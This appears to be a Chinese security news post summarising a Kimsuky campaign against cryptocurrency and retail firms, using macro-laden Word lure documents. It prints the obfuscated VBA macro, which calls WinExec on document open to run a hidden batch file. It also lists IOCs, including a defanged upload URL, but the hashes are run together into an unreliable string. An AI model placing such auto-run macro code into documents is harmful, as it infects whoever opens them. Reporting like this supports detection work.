3 月 21 日，研究人员发现了 Kimsuky 组织的新攻击行动。Kimsuky
使用加密货币相关信息作为诱饵文件，看样子应该是针对加密货币公司发起的攻击。发现的恶意 Word 文件都是由名为 Acer 的作者创建的：

    
    
    Regarding Quantity of Stakeholder.doc (修改者: Acer, 修改时间: 2022-03-21 10:29 AM)Assets and Liabilities Status.doc (修改者: Acer, 修改时间: 2022-03-21 11:10 AM)The 3rd Stakeholder Meeting.doc (修改者: Acer, 修改时间: 2022-03-21 11:03 AM)﻿

![image.png-148.2kB](https://image.3001.net/images/20220329/1648547164_6242d55c4054ed1e30d8a.png!small)诱饵文档

![image.png-204.7kB](https://image.3001.net/images/20220329/1648547164_6242d55ce2326e7dbe4c2.png!small)诱饵文档

![image.png-105.6kB](https://image.3001.net/images/20220329/1648547165_6242d55d82d523008bbfc.png!small)诱饵文档

![image.png-54.7kB](https://image.3001.net/images/20220329/1648547165_6242d55deea63999eb606.png!small)诱饵文档横向比较

所有的诱饵文件都使用相同的宏代码：

    
    
    Private Declare PtrSafe Function NqBHp7qCwNnGUYNUeNUrpXNqBHp7qCwNnGUYNUeNUrpXVpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrpXVpyNwqBwFxjyXqyXNqBHp7qCwNnGUYNUeNUrpXVpyNpDYkWbfyp4YLUJGqXtYK3VpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrp Lib "kernel32" Alias "WinExec" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As LongSub Document_Open()NqBHp7qCwNnGUYNUeNUrpXNqBHp7qCwNnGUYNUeNUrpXVpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrpXVpyNwqBwFxjyXqyXNqBHp7qCwNnGUYNUeNUrpXVpyNpDYkWbfyp4YLUJGqXtYK3VpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrp "C:\Users\Public\Documents\no1.bat", 0End Sub﻿

看起来是由另一个 Wrod 文件来运行 `no1.bat`，就像过去介绍的那样，由提示用户点击启用宏代码的恶意文档创建的。

![image.png-108.5kB](https://image.3001.net/images/20220329/1648547166_6242d55e59ccab3b30d94.png!small)恶意文档

研究人员也发现了伪装成产品介绍文件的恶意文档与上面的恶意文档采用相同的分发方式与执行流程，这意味着攻击者也针对零售分销行业发起攻击。

## IOC

    
    
    0ecc9a4cea5c289732c76234c47a60e982ed73e4adbe5c26bafb-5072657fd46b7a2f350a2a6aa1d065c2b19be6dc6fb48a2eeafca1b33010d7ed812cf17d42f5869f98aac4963c7db7276d2a914d081ea872dbb06e2dc721f180d05e2c1c8c2056a936b9b3a3bdafed40cf5d056febafdc0223fb97891a90049d0c0d2beeb756http[://sysrtri-man.com/upl11/upload.php

## 参考来源

> [ASEC](https://asec.ahnlab.com/en/32958/)

